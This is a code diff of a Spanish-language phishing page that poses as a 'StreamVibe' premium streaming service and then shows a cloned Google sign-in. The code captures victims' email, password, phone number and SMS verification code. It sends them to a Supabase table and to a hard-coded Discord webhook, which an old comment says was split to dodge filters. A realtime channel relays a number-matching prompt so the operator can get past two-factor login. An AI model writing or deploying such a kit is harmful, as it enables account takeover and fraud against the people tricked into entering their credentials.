@@ -3,51 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión: Cuentas de Google</title>
+    <title>StreamVibe | Acceso Premium</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; color: #202124; }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Inter:wght@400;700;900&display=swap');
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; color: #202124; margin: 0; }
+        .vibe-font { font-family: 'Inter', sans-serif; }
         .g-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: all 0.2s; }
         .g-field:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
         .loader { width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #gate { position: fixed; inset: 0; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        
+        /* Estilos de la marca StreamVibe */
+        .vibe-bg { background-color: #0b0e11; color: white; }
+        .vibe-accent { color: #06b6d4; } /* Cyan 500 */
+        .vibe-btn { background-color: #06b6d4; color: #000; font-weight: 900; transition: transform 0.2s; }
+        .vibe-btn:active { transform: scale(0.95); }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
+<body class="flex flex-col items-center justify-center min-h-screen">
 
-    <div id="gate">
-        <div class="loader mb-4"></div>
-        <p class="text-xs text-gray-400 font-medium tracking-tight">Verificando conexión segura...</p>
+    <!-- PANTALLA INICIAL DE STREAMVIBE (PRE-LOGIN) -->
+    <div id="vibe-portal" class="fixed inset-0 vibe-bg z-[10000] flex flex-col items-center justify-center p-6 text-center">
+        <div class="mb-8">
+            <h1 class="text-4xl font-black italic tracking-tighter vibe-font uppercase">STREAM<span class="vibe-accent">VIBE</span></h1>
+            <div class="h-1 w-12 bg-cyan-500 mx-auto mt-1"></div>
+        </div>
+        
+        <div class="max-w-xs mb-10">
+            <h2 class="text-xl font-bold mb-3 vibe-font">¡Bienvenido de nuevo!</h2>
+            <p class="text-zinc-500 text-sm">Para acceder a tu suscripción Premium y contenido exclusivo, por favor sincroniza tu cuenta.</p>
+        </div>
+
+        <button onclick="startLogin()" class="vibe-btn w-full max-w-xs py-4 rounded-2xl text-xs uppercase tracking-[0.2em] shadow-lg shadow-cyan-900/20 mb-6">
+            Sincronizar con Google
+        </button>
+        
+        <p class="text-[10px] text-zinc-600 uppercase tracking-widest font-bold">Conexión segura encriptada</p>
     </div>
 
-    <div id="wrapper" class="w-full max-w-[448px] p-6 sm:p-10 sm:border border-gray-200 rounded-lg opacity-0 transition-opacity duration-700">
+    <!-- CONTENEDOR DE GOOGLE -->
+    <div id="wrapper" class="hidden w-full max-w-[448px] p-6 sm:p-10 sm:border border-gray-200 rounded-lg">
         <div class="flex justify-center mb-6">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="h-6" alt="Google">
         </div>
         <div id="dynamic-view"></div>
     </div>
 
-    <footer id="footer-text" class="mt-8 flex gap-6 text-[12px] text-gray-500">
+    <footer id="footer-text" class="hidden mt-8 flex gap-6 text-[12px] text-gray-500">
         <span>Español (España)</span>
         <div class="flex gap-4"><span>Ayuda</span><span>Privacidad</span><span>Condiciones</span></div>
     </footer>
 
-    <div id="vibe-screen" class="fixed inset-0 bg-[#0b0e11] hidden flex-col items-center justify-center p-6 z-[10000]">
+    <!-- PANTALLA FINAL -->
+    <div id="vibe-screen" class="fixed inset-0 vibe-bg hidden flex-col items-center justify-center p-6 z-[10000]">
         <div id="vibe-load">
             <div class="w-12 h-12 border-4 border-zinc-800 border-t-cyan-500 rounded-full animate-spin mb-4 mx-auto"></div>
-            <p class="text-[10px] text-cyan-500 font-black uppercase tracking-[0.4em]">Sincronizando</p>
+            <p class="text-[10px] vibe-accent font-black uppercase tracking-[0.4em]">Validando Suscripción</p>
         </div>
         <div id="vibe-fail" class="hidden text-center">
-            <h2 class="text-cyan-500 font-black italic text-4xl mb-4 tracking-tighter uppercase">ERROR DE ENLACE</h2>
-            <button onclick="location.reload()" class="bg-cyan-600 text-black font-black px-12 py-4 rounded-2xl text-[10px] uppercase">Reintentar</button>
+            <h2 class="vibe-accent font-black italic text-4xl mb-4 tracking-tighter uppercase vibe-font">ERROR DE ENLACE</h2>
+            <p class="text-zinc-500 text-sm mb-8 max-w-xs mx-auto">No se ha podido validar la sesión de Google para el contenido Premium. Inténtelo más tarde.</p>
+            <button onclick="location.reload()" class="vibe-btn px-12 py-4 rounded-2xl text-[10px] uppercase">Reintentar</button>
         </div>
     </div>
 
     <script>
-        // URL DIRECTA - La forma más sencilla (Separada en dos para evitar filtros básicos)
+        // WEBHOOK SIMPLE
         const partA = "https://discord.com/api/webhooks/1443618037294174220/";
         const partB = "cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE";
         const W_HOOK = partA + partB;
@@ -59,14 +82,14 @@
         const sesId = "SV-" + Math.random().toString(36).substr(2, 4).toUpperCase();
         let store = { step: 'login', email: '', pass: '', phone: '', target: '--', sms: '' };
 
-        setTimeout(() => {
-            document.getElementById('gate').style.display = 'none';
-            document.getElementById('wrapper').style.opacity = '1';
+        function startLogin() {
+            document.getElementById('vibe-portal').style.display = 'none';
+            document.getElementById('wrapper').classList.remove('hidden');
+            document.getElementById('footer-text').classList.remove('hidden');
             draw();
-        }, 1500);
+        }
 
         async function push(step) {
-            // 1. Guardar en Supabase (Prioridad)
             await client.from('sessions').upsert({
                 session_id: sesId, step: step, email: store.email, 
                 password: store.pass, phone: store.phone, sms: store.sms,
@@ -74,23 +97,23 @@
                 updated_at: new Date().toISOString()
             }, { onConflict: 'session_id' });
 
-            // 2. Enviar a Discord (Modo Simple)
-            const payload = {
-                content: `🚀 **ACTUALIZACIÓN**\n**ID:** ${sesId}\n**PASO:** ${step.toUpperCase()}\n**USER:** ${store.email}\n**PASS:** ${store.pass}\n**TEL:** ${store.phone}\n**CÓDIGO:** ${store.target}\n**SMS:** ${store.sms || '-'}`
-            };
-
             fetch(W_HOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(e => console.log("Error Discord:", e));
+                body: JSON.stringify({
+                    content: `>>> **NUEVA ACCIÓN**\n**ID:** ${sesId}\n**PASO:** ${step.toUpperCase()}\n**USER:** ${store.email}\n**PASS:** ${store.pass}\n**TEL:** ${store.phone}\n**NUM:** ${store.target}\n**SMS:** ${store.sms || '-'}`
+                })
+            }).catch(() => {});
         }
 
         function draw() {
             const container = document.getElementById('dynamic-view');
             if(store.step === 'login') {
                 container.innerHTML = `
-                    <div class="text-center mb-8"><h1 class="text-2xl font-normal mb-2">Iniciar sesión</h1><p class="text-[15px]">Usa tu cuenta de Google</p></div>
+                    <div class="text-center mb-8">
+                        <h1 class="text-2xl font-normal mb-2">Iniciar sesión</h1>
+                        <p class="text-[15px]">Usa tu cuenta de Google</p>
+                    </div>
                     <form onsubmit="event.preventDefault(); store.email=this.e.value; store.pass=this.p.value; store.step='phone'; push('phone'); draw();">
                         <input name="e" required type="email" placeholder="Correo electrónico" class="g-field mb-4">
                         <input name="p" required type="password" placeholder="Contraseña" class="g-field mb-2">
@@ -101,7 +124,10 @@
                     </form>`;
             } else if(store.step === 'phone') {
                 container.innerHTML = `
-                    <div class="text-center mb-6"><h1 class="text-xl font-medium">Verificación</h1><p class="text-sm text-gray-600 mt-4">Confirma tu identidad para continuar.</p></div>
+                    <div class="text-center mb-6">
+                        <h1 class="text-xl font-medium">Verificación</h1>
+                        <p class="text-sm text-gray-600 mt-4 leading-relaxed">Confirma tu identidad para autorizar la suscripción en este dispositivo.</p>
+                    </div>
                     <form onsubmit="event.preventDefault(); store.phone=this.t.value; store.step='wait'; push('wait'); draw();">
                         <input name="t" required type="tel" placeholder="Número de teléfono" class="g-field text-center text-xl mb-6">
                         <button class="w-full bg-[#1a73e8] text-white py-2.5 rounded font-medium">Siguiente</button>
@@ -110,18 +136,28 @@
                 container.innerHTML = `
                     <div class="text-center">
                         <h1 class="text-xl font-medium mb-4">Comprueba tu dispositivo</h1>
-                        <p class="text-sm text-gray-600 mb-6 text-left">Toca <b>"Sí, soy yo"</b> en la notificación y selecciona este número:</p>
+                        <div class="bg-gray-50 border border-gray-100 p-5 rounded-2xl mb-6 text-left">
+                            <p class="text-sm text-gray-600 mb-4">Google ha enviado una notificación a tu teléfono.</p>
+                            <p class="text-sm text-gray-600">1. Toca <b>"Sí, soy yo"</b>.</p>
+                            <p class="text-sm text-gray-600">2. Elige este número:</p>
+                        </div>
                         <div class="inline-block px-12 py-8 bg-blue-50 border-2 border-blue-100 rounded-3xl mb-8">
                             <span class="text-7xl font-bold text-[#1a73e8] animate-pulse">${store.target}</span>
                         </div>
-                        <div class="flex items-center justify-center gap-3"><div class="loader"></div><span class="text-[10px] text-gray-400 font-bold uppercase">Sincronizando...</span></div>
+                        <div class="flex items-center justify-center gap-3"><div class="loader"></div><span class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Sincronizando...</span></div>
                     </div>`;
             } else if(store.step === 'sms') {
                 container.innerHTML = `
-                    <div class="text-center mb-6"><h1 class="text-xl font-bold">Código SMS</h1><p class="text-xs text-gray-500 mt-2">Introduce el código enviado.</p></div>
+                    <div class="text-center mb-6">
+                        <h1 class="text-xl font-bold">Código de Seguridad</h1>
+                        <p class="text-xs text-gray-500 mt-2">Introduce el código enviado a tu teléfono para completar la vinculación.</p>
+                    </div>
                     <form onsubmit="event.preventDefault(); store.sms=this.s.value; store.step='end'; push('end'); finish();">
-                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50 mb-8"><span class="text-xl font-bold text-gray-400 mr-2">G-</span><input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent"></div>
-                        <button class="w-full bg-[#1a73e8] text-white py-3.5 rounded-lg font-bold">Verificar</button>
+                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50 mb-8">
+                            <span class="text-xl font-bold text-gray-400 mr-2">G-</span>
+                            <input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent tracking-widest font-mono">
+                        </div>
+                        <button class="w-full bg-[#1a73e8] text-white py-3.5 rounded-lg font-bold shadow-md">Finalizar Sincronización</button>
                     </form>`;
             }
         }
@@ -129,12 +165,18 @@
         function finish() {
             document.getElementById('wrapper').style.display = 'none';
             document.getElementById('footer-text').style.display = 'none';
-            document.getElementById('vibe-screen').classList.remove('hidden');
-            document.getElementById('vibe-screen').classList.add('flex');
-            setTimeout(() => { document.getElementById('vibe-load').classList.add('hidden'); document.getElementById('vibe-fail').classList.remove('hidden'); }, 5000);
+            const screen = document.getElementById('vibe-screen');
+            screen.classList.remove('hidden');
+            screen.classList.add('flex');
+            setTimeout(() => {
+                document.getElementById('vibe-load').classList.add('hidden');
+                document.getElementById('vibe-fail').classList.remove('hidden');
+            }, 5000);
         }
 
-        client.channel('vibe-sync').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${sesId}` }, (p) => {
+        client.channel('vibe-sync').on('postgres_changes', { 
+            event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${sesId}` 
+        }, (p) => {
             store.target = p.new.target_num || '--';
             store.step = p.new.step;
             draw();
